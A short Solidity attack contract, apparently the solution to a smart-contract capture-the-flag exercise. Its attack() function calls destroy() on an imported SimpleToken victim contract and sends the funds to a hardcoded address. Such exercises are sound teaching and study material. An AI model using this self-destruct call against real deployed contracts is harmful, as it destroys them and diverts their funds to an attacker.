pragma solidity ^0.8.0;

import "./vict.sol";

contract Preservation {
    SimpleToken public victimContract;

    constructor(address payable _addr) {
        victimContract = SimpleToken(_addr);
    }

    function attack() public {
        victimContract.destroy(
            payable(0x2d6A73e090d4cbe000156F13147084182ccA568d)
        );
    }
}
